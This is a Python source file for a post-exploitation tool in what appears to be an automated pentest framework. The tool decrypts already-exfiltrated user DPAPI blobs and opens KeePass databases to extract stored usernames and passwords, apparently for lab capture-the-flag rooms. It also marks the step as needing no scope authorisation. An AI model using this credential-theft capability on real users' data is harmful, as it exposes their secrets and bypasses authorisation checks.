"""Durable ``nexus.post.dpapi`` handler: offline DPAPI / KeePass loot (V0-39).

Why this tool exists (a synthetic lab run): the room's last flag lives in the
KeePass database of a user and the database key is wrapped in **user-scope DPAPI**
(``ProtectedUserKey.bin``), which in turn is unlocked by that user's DPAPI
masterkey. With domain admin the masterkey comes from the domain backup key; both
blobs are *already exfiltrated artifacts*, so the whole step is an offline
computation over the engagement workspace — yet no governed primitive covered it,
and the operator had to leave OMNI and chain ``impacket-dpapi`` + ``dploot`` +
``pykeepass`` by hand (the flag was obtained but never accredited, and every
Windows room with a DPAPI-protected secret store pays the same tax).

The tool ships :mod:`nexus_core.tools.dpapi_client` — stdlib only, no network, no
new dependency — through the sandbox, and reports the **cryptographic**
post-condition rather than "the command exited 0":

* ``unwrap`` proves the blob's own signature (HMAC over the masterkey-derived
  session key) before returning the recovered key material;
* ``open_kdbx`` proves the KDBX ``StreamStartBytes`` *and* every block hash before
  reading any entry.

Both negatives are declared instead of being dressed as success: a wrong masterkey
or a wrong entropy is ``dpapi_signature_invalid``, and key material that does not
open the database is ``kdbx_credentials_invalid``.
"""

from __future__ import annotations

import base64
import hashlib
import json
import re
from functools import lru_cache
from pathlib import Path
from typing import Any

from nexus_core.kernel.models import RiskLevel, RunContext, ToolDefinition, ToolResult
from nexus_core.kernel.sandbox import sandbox_for_environment
from nexus_core.tools import dpapi_client

from ._exec import RECON_ALLOWED_PROGRAMS, run_in_sandbox, safe_run_id
from .workspace import resolve_workspace_path, workspace_root

DPAPI_ACTIONS = ("unwrap", "open_kdbx")
DPAPI_DEFAULT_TIMEOUT_SECONDS = 240
DPAPI_MAX_TIMEOUT_SECONDS = 600
#: KeePass' own entropy (KeePassLib/Keys/KcpUserAccount.cs :: s_entropy). It is not
#: stored in the blob, so it has to be supplied by the caller.
KEEPASS_ENTROPY_HEX = dpapi_client.KEEPASS_ENTROPY.hex()
DPAPI_MAX_MASTERKEY_HEX = 512
DPAPI_MAX_MATERIAL_HEX = 4096
DPAPI_MAX_ENTROPY_HEX = 256
#: KeePass writes at most a few dozen entries; the cap keeps the output bounded.
DPAPI_MAX_ENTRIES = dpapi_client.MAX_ENTRIES

_HEX_RE = re.compile(r"[0-9a-fA-F]+")
_CLIENT_ERROR_KINDS = {
    "dpapi_signature_invalid": "dpapi_signature_invalid",
    "invalid_masterkey": "dpapi_invalid_input",
    "invalid_hex": "dpapi_invalid_input",
    "missing_file": "dpapi_invalid_input",
    "file_too_large": "dpapi_invalid_input",
}


@lru_cache(maxsize=1)
def client_source() -> str:
    """Return the standalone client's source (shipped with ``python3 -c``)."""
    return Path(dpapi_client.__file__).read_text(encoding="utf-8")


def _validate_action(value: Any) -> str:
    action = str(value or "unwrap").strip().lower()
    if action not in DPAPI_ACTIONS:
        raise ValueError(f"unsupported action: {action!r}")
    return action


def _normalize_hex(value: Any, field: str, *, max_chars: int) -> str:
    """Return an even-length lowercase hex string, or raise ``ValueError``."""
    text = str(value or "").strip()
    if text.startswith(("0x", "0X")):
        text = text[2:]
    if not text:
        raise ValueError(f"{field} is required")
    if len(text) > max_chars:
        raise ValueError(f"{field} is too long")
    if len(text) % 2 or not _HEX_RE.fullmatch(text):
        raise ValueError(f"{field} must be an even-length hex string")
    return text.lower()


def _validate_entropy(value: Any) -> str:
    """Return the blob entropy as hex, or ``\"-\"`` when none was provided."""
    text = str(value or "").strip()
    if text in ("", "-", "none", "null"):
        return "-"
    return _normalize_hex(text, "entropy", max_chars=DPAPI_MAX_ENTROPY_HEX)


def _validate_max_entries(value: Any) -> int:
    if value in (None, ""):
        return DPAPI_MAX_ENTRIES
    try:
        return max(1, min(int(value), DPAPI_MAX_ENTRIES))
    except (TypeError, ValueError):
        raise ValueError("max_entries must be an integer") from None


def _material_hex(arguments: dict) -> str:
    """Return the key material as hex, from ``material`` or ``material_file``.

    ``material_file`` is what a previous ``unwrap`` left in the workspace, so the
    two actions chain without the operator copying 128 hex characters by hand.
    """
    raw = str(arguments.get("material") or "").strip()
    if raw:
        return _normalize_hex(raw, "material", max_chars=DPAPI_MAX_MATERIAL_HEX)
    path_value = str(arguments.get("material_file") or "").strip()
    if not path_value:
        raise ValueError("material or material_file is required")
    path = resolve_workspace_path(path_value)
    data = path.read_bytes()
    if len(data) > DPAPI_MAX_MATERIAL_HEX // 2:
        raise ValueError("material_file is too large to be key material")
    text = data.decode("utf-8", "ignore").strip()
    if text and len(text) % 2 == 0 and _HEX_RE.fullmatch(text):
        return text.lower()
    return data.hex()


def dpapi_definition(tenant_id: str = "system") -> ToolDefinition:
    """Return the durable ToolDefinition for ``nexus.post.dpapi``."""
    return ToolDefinition(
        tool_id="nexus.post.dpapi",
        idempotent=True,
        name="DPAPI / KeePass loot (offline)",
        tenant_id=tenant_id,
        description=(
            "Descifra artefactos DPAPI ya exfiltrados, sin red. "
            "action=unwrap: descifra un blob de usuario (CryptProtectData) con su "
            "masterkey y una entropía opcional — la de KeePass es "
            f"{KEEPASS_ENTROPY_HEX} — y VERIFICA la firma del blob antes de "
            "devolver el material de clave. "
            "action=open_kdbx: abre una base KeePass KDBX 3.1 con ese material y "
            "devuelve sus entradas (títulos, usuarios, contraseñas, URLs), "
            "verificando StreamStartBytes y el hash de cada bloque. "
            "Es el último tramo del loot cuando la bandera vive en un KeePass o "
            "en cualquier secreto protegido por DPAPI."
        ),
        input_schema={
            "type": "object",
            "properties": {
                "action": {"type": "string", "enum": list(DPAPI_ACTIONS), "default": "unwrap"},
                "blob_file": {
                    "type": "string",
                    "maxLength": 4096,
                    "description": "Blob DPAPI en el workspace (ProtectedUserKey.bin, …).",
                },
                "masterkey": {
                    "type": "string",
                    "maxLength": DPAPI_MAX_MASTERKEY_HEX,
                    "description": "Masterkey DPAPI del usuario en hex (64 bytes).",
                },
                "entropy": {
                    "type": "string",
                    "maxLength": DPAPI_MAX_ENTROPY_HEX,
                    "description": "Entropía del blob en hex; '-' si no tiene.",
                },
                "kdbx_file": {
                    "type": "string",
                    "maxLength": 4096,
                    "description": "Base KDBX 3.1 en el workspace (Database.kdbx).",
                },
                "material": {
                    "type": "string",
                    "maxLength": DPAPI_MAX_MATERIAL_HEX,
                    "description": "Material de clave en hex (salida de unwrap).",
                },
                "material_file": {
                    "type": "string",
                    "maxLength": 4096,
                    "description": "Fichero del workspace con el material de unwrap.",
                },
                "max_entries": {
                    "type": "integer",
                    "minimum": 1,
                    "maximum": DPAPI_MAX_ENTRIES,
                },
                "timeout_seconds": {
                    "type": "integer",
                    "minimum": 10,
                    "maximum": DPAPI_MAX_TIMEOUT_SECONDS,
                },
            },
            "required": ["action"],
            "additionalProperties": False,
        },
        risk=RiskLevel.MEDIUM,
        effect="credential_access",
        required_permissions=["execute:tool:nexus.post.dpapi"],
        timeout_seconds=DPAPI_MAX_TIMEOUT_SECONDS + 30,
        max_output_bytes=500_000,
        # Offline computation over already-exfiltrated artifacts: no target is
        # touched, so there is nothing for the scope validator to authorize.
        scope_required=False,
        sandbox_required=True,
    )


def _parse_payload(stdout: str) -> dict[str, Any]:
    """Return the last JSON object printed by the embedded client."""
    for line in reversed((stdout or "").splitlines()):
        line = line.strip()
        if line.startswith("{"):
            try:
                value = json.loads(line)
            except json.JSONDecodeError:
                continue
            if isinstance(value, dict):
                return value
    return {"ok": False, "error": "dpapi_no_result",
            "detail": "the embedded client produced no JSON"}


async def dpapi_handler(arguments: dict, context: RunContext) -> ToolResult:
    """Run the DPAPI/KeePass client through the sandbox and report what it proved."""
    action = _validate_action(arguments.get("action"))
    requested_timeout = arguments.get("timeout_seconds")
    timeout_seconds = min(
        DPAPI_MAX_TIMEOUT_SECONDS,
        max(10, int(requested_timeout) if requested_timeout
            else DPAPI_DEFAULT_TIMEOUT_SECONDS),
    )

    evidence: dict[str, Any] = {"action": action, "noise_level": "none",
                                "timeout_seconds": timeout_seconds}
    if action == "unwrap":
        blob_path = resolve_workspace_path(str(arguments.get("blob_file") or ""))
        argv_tail = [
            "unwrap",
            str(blob_path),
            _normalize_hex(arguments.get("masterkey"), "masterkey",
                           max_chars=DPAPI_MAX_MASTERKEY_HEX),
            _validate_entropy(arguments.get("entropy")),
        ]
        evidence["blob_file"] = blob_path.name
        evidence["blob_bytes"] = blob_path.stat().st_size
        evidence["entropy_used"] = argv_tail[3] != "-"
    else:
        kdbx_path = resolve_workspace_path(str(arguments.get("kdbx_file") or ""))
        argv_tail = [
            "open_kdbx",
            str(kdbx_path),
            _material_hex(arguments),
            str(_validate_max_entries(arguments.get("max_entries"))),
        ]
        evidence["kdbx_file"] = kdbx_path.name
        evidence["kdbx_bytes"] = kdbx_path.stat().st_size

    sandbox = sandbox_for_environment(workspace_root(), allowed_programs=RECON_ALLOWED_PROGRAMS)
    result = await run_in_sandbox(
        sandbox,
        ["python3", "-c", client_source(), *argv_tail],
        timeout_seconds=timeout_seconds,
        image_env="NEXUS_DPAPI_IMAGE",
        default_image="python:3.12-alpine",
    )
    payload = _parse_payload(result.stdout or "")

    if result.timed_out:
        return ToolResult(
            output=payload | {"error": "dpapi run timed out"},
            verified=False,
            verification_method="dpapi_timeout",
            evidence=evidence,
            exit_code=result.exit_code,
            accepted_exit_codes=(0,),
            stdout=result.stdout,
            stderr=result.stderr,
            timed_out=True,
        )

    if not payload.get("ok"):
        code = str(payload.get("error") or "dpapi_failed")
        return ToolResult(
            output=payload,
            verified=False,
            verification_method=_negative_method(action, code),
            evidence=evidence | {"client_error": code, "detail": payload.get("detail")},
            exit_code=result.exit_code,
            accepted_exit_codes=(0,),
            stdout=result.stdout,
            stderr=result.stderr,
        )

    if action == "unwrap":
        return _unwrap_result(payload, evidence, context, result)
    return _kdbx_result(payload, evidence, result)


def _negative_method(action: str, code: str) -> str:
    """Map a client error code onto the tool's declared negative vocabulary."""
    if code in _CLIENT_ERROR_KINDS:
        return _CLIENT_ERROR_KINDS[code]
    if action == "unwrap":
        return "dpapi_blob_invalid" if code.startswith("dpapi_") else "dpapi_failed"
    if code == "kdbx_credentials_invalid":
        return "kdbx_credentials_invalid"
    return "kdbx_failed"


def _unwrap_result(payload: dict, evidence: dict, context: RunContext, result: Any) -> ToolResult:
    """Persist the recovered material and report the verified unwrap."""
    material = base64.b64decode(str(payload.get("material_b64") or ""))
    artifact = ""
    if material:
        artifact = str(
            (Path(workspace_root()) / f"dpapi_material_{safe_run_id(context)}.bin").resolve()
        )
        try:
            Path(artifact).write_bytes(material)
        except OSError:
            artifact = ""
    evidence.update(
        {
            "material_bytes": len(material),
            "material_sha256": hashlib.sha256(material).hexdigest(),
            "master_key_guid": payload.get("guid"),
            "crypt_algo": payload.get("crypt_algo"),
            "hash_algo": payload.get("hash_algo"),
            "session_key_variant": payload.get("session_key_variant"),
            "signature_verified": bool(payload.get("signature_verified")),
            "artifact": artifact or None,
        }
    )
    return ToolResult(
        output={
            "action": "unwrap",
            "material_hex": payload.get("material_hex"),
            "material_bytes": len(material),
            "material_sha256": payload.get("material_sha256"),
            "artifact": artifact or None,
            "master_key_guid": payload.get("guid"),
            "crypt_algo": payload.get("crypt_algo"),
            "hash_algo": payload.get("hash_algo"),
            "signature_verified": bool(payload.get("signature_verified")),
        },
        verified=bool(payload.get("signature_verified")) and bool(material),
        verification_method="dpapi_unwrapped",
        evidence=evidence,
        exit_code=result.exit_code,
        accepted_exit_codes=(0,),
        stdout=result.stdout,
        stderr=result.stderr,
    )


def _kdbx_result(payload: dict, evidence: dict, result: Any) -> ToolResult:
    """Report the opened database (entries plus any flag-shaped loot)."""
    entries = payload.get("entries") or []
    evidence.update(
        {
            "format": payload.get("format"),
            "rounds": payload.get("rounds"),
            "groups": payload.get("groups"),
            "entry_count": payload.get("entry_count"),
            "entries_returned": len(entries),
            "truncated": bool(payload.get("truncated")),
            "flags": payload.get("flags") or [],
        }
    )
    return ToolResult(
        output={
            "action": "open_kdbx",
            "format": payload.get("format"),
            "rounds": payload.get("rounds"),
            "groups": payload.get("groups"),
            "entries": entries,
            "entry_count": payload.get("entry_count"),
            "truncated": bool(payload.get("truncated")),
            "flags": payload.get("flags") or [],
        },
        verified=True,
        verification_method="kdbx_opened",
        evidence=evidence,
        exit_code=result.exit_code,
        accepted_exit_codes=(0,),
        stdout=result.stdout,
        stderr=result.stderr,
    )


__all__ = [
    "DPAPI_ACTIONS",
    "DPAPI_MAX_ENTRIES",
    "KEEPASS_ENTROPY_HEX",
    "client_source",
    "dpapi_definition",
    "dpapi_handler",
]
